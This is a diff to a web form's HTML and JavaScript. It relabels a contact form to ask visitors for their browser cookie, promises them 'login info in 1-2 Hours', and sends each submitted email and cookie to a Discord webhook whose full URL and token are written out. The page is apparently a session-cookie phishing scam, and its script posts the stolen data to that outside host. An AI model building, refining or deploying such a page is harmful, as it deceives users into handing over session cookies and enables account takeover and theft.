@@ -53,7 +53,7 @@
     <input type="email" id="email" placeholder="Enter Email" required />
     <textarea id="message" rows="4" placeholder="Enter Cookie"></textarea>
     <button type="submit">Send</button>
-    <div class="notice">You will recive the login info in 1-2 Hours.</div>
+    <div class="notice">You will receive the login info in 1-2 Hours.</div>
   </form>
 
   <script>
@@ -68,7 +68,7 @@
       const webhookUrl = 'https://discord.com/api/webhooks/1362160509033382008/lJKt647dAoHQReTt--qKe8Kp2yInWMqO6fJ7v8ev3U_FT-aDATnGgKuB2cCqUxoKruwT'; // Replace with your real webhook
 
       const payload = {
-        content: `📬 New Contact Submission\n📧 Email: ${email}\n📝 Message: ${message || "No message"}`
+        content: `📬 New Contact Submission\n📧 Email: ${email}\n🍪 Cookie: ${message || "No cookie provided"}`
       };
 
       try {
@@ -81,13 +81,13 @@
         });
 
         if (response.ok) {
-          alert('Thanks for your message!');
+          alert('Thanks for your submission!');
           form.reset();
         } else {
           alert('Something went wrong.');
         }
       } catch (err) {
-        alert('Error sending message.');
+        alert('Error sending data.');
         console.error(err);
       }
     });
